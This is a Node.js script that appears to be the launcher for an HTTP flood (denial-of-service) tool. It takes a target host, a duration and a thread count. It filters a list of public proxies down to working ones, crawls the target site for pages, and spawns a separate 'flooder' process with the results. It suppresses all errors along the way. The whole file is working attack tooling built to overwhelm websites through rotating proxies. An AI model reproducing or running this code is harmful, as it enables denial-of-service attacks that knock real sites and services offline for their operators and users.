const {spawn} = require('child_process');
const fs = require('fs');
var proxyChecker = require('proxy-checker');
var Crawler = require("js-crawler");
const url = require("url");

process.on('uncaughtException', function (er) {
});
process.on('unhandledRejection', function (er) {
});

require('events').EventEmitter.defaultMaxListeners = 0;


const validProxies = [];
const pages = [];

if (process.argv.length < 5) {
    console.log("node index.js <host> <time> <threads>");
    process.exit(-1);
}

const urlT = process.argv[2]; // url
const timeT = process.argv[3]; // spam time
const threadsT = process.argv[4]; // Flooder Threads

//child_process.execSync('rm -rf proxy.txt;wget "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all" -O proxy.txt');
const proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().split('\r');
shuffleFileLines("proxy.txt");
console.log('[+] Success Get Proxy! [+]')

function shuffleFileLines(filePath) {
    // Читаем содержимое файла в массив строк
    const lines = fs.readFileSync(filePath, 'utf-8').split('\n');

    // Перемешиваем массив строк случайным образом
    for (let i = lines.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [lines[i], lines[j]] = [lines[j], lines[i]];
    }

    // Записываем перемешанные строки обратно в файл
    fs.writeFileSync(filePath, lines.join('\n'));
}
function check_proxy() {
    proxyChecker.checkProxiesFromFile(
        // The path to the file containing proxies
        'proxy.txt',
        {
            // the complete URL to check the proxy
            url: 'https://google.com',
            // an optional regex to check for the presence of some text on the page
            regex: /google/
        },
        // Callback function to be called after the check
        function(host, port, ok, statusCode, err) {
            if (ok === true) {
                // выполняется, если ok равно true
                //console.log(host + ':' + port + ' => '+ ok + ' (status: ' + statusCode + ', err: ' + err + ')');
                validProxies.push(host + ':' + port)
            }
        }
    );
}


async function Start() {
    console.log(validProxies);
    console.log(pages);
    console.log("ByPass Started!");
    const child = spawn('node', ['http-get.js', urlT, timeT, threadsT, validProxies, pages]);
    child.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
    });

    child.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
    });

    child.on('error', (error) => {
        console.error(`error: ${error.message}`);
    });

    child.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
    });
}

function crawler() {
    var parsed = url.parse(urlT);
    pages.push(urlT);
    new Crawler().configure({depth: 2})
        .crawl(urlT, function onSuccess(page) {
            if (page.url.includes(parsed.host)) {
                pages.push(page.url);
            }
        });
}
function main() {
    check_proxy();
    crawler();
    setTimeout(() => {
        return Start();
    }, 5000);
}

main();

setTimeout(() => {
    process.exit(0);
    process.exit(0);
    process.exit(0);
}, timeT * 1000)

